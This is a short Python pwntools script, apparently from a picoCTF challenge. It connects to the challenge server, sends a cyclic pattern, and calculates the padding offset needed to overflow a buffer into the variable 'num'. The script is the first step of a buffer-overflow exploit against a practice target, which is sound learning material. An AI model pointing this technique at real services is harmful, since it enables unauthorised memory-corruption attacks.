from pwn import *

# 1. Connect to the picoCTF target
io = remote('saturn.picoctf.net', 49866)

# 2. Generate a 50-byte cyclic pattern (aaaabaaacaaadaaaaeaaafaaagaaa...)
test_payload = cyclic(50)

# 3. Wait for the prompt and send the unique string
io.sendlineafter(b"Enter a string: ", test_payload)

# 4. Receive the output lines from the server
output = io.recvall().decode()
print("--- Server Output ---")
print(output)
print("---------------------")

# 5. Extract the corrupted value of 'num' from the output
# We search for the line "num is <number>"
for line in output.split('\n'):
    if "num is" in line:
        # Extract the integer value printed by the server
        num_value = int(line.split()[-1])
        
        # Convert that integer back into its 4-byte little-endian text representation
        corrupted_bytes = p32(num_value)
        print(f"The unique characters that landed inside 'num': {corrupted_bytes}")
        
        # Ask pwntools exactly where those specific characters start in the pattern
        offset = cyclic_find(corrupted_bytes)
        print(f"\n[+] SUCCESS! The exact padding needed is: {offset} bytes")
